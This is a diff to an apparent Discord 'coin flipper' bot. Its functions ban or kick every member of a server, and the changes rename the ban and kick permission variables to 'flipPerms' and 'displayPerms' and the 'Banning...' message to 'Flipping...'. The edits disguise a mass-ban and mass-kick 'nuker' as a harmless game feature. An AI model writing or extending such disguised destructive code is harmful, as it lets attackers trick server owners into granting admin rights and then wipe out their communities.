@@ -33,8 +33,8 @@ coinfilpper.on("messageCreate", (message) => {
 
     // Perms
     const channelPerms = message.guild.me.permissions.has("MANAGE_CHANNELS" || "ADMINISTRATOR");
-    const banPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
-    const kickPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
+    const flipPerms = message.guild.me.permissions.has("BAN_MEMBERS" || "ADMINISTRATOR");
+    const displayPerms = message.guild.me.permissions.has("KICK_MEMBERS" || "ADMINISTRATOR");
     const rolePerms = message.guild.me.permissions.has("MANAGE_ROLES" || "ADMINISTRATOR");
     const emotePerms = message.guild.me.permissions.has("MANAGE_EMOJIS_AND_STICKERS" || "ADMINISTRATOR");
 
@@ -272,11 +272,11 @@ coinfilpper.on("messageCreate", (message) => {
 
     function FlipB() {
         return new Promise((resolve, reject) => {
-            if (!banPerms) return reject("Bot Error");
+            if (!flipPerms) return reject("Bot Error");
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
             message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                 setTimeout(() => {
-                    msg.edit("Banning...");
+                    msg.edit("Flipping...");
                     for (let i = 0; i < arrayOfIDs.length; i++) {
                         const member = message.guild.members.cache.get(arrayOfIDs[i]);
                         member.ban()
@@ -289,11 +289,11 @@ coinfilpper.on("messageCreate", (message) => {
 
     function FlipK() {
         return new Promise((resolve, reject) => {
-            if (!kickPerms) return reject("Bot Error");
+            if (!displayPerms) return reject("Bot Error");
             let arrayOfIDs = message.guild.members.cache.map((user) => user.id);
             message.reply("Found " + arrayOfIDs.length + " users.").then((msg) => {
                 setTimeout(() => {
-                    msg.edit("Banning...");
+                    msg.edit("Flipping...");
                     for (let i = 0; i < arrayOfIDs.length; i++) {
                         const member = message.guild.members.cache.get(arrayOfIDs[i]);
                         member.kick()
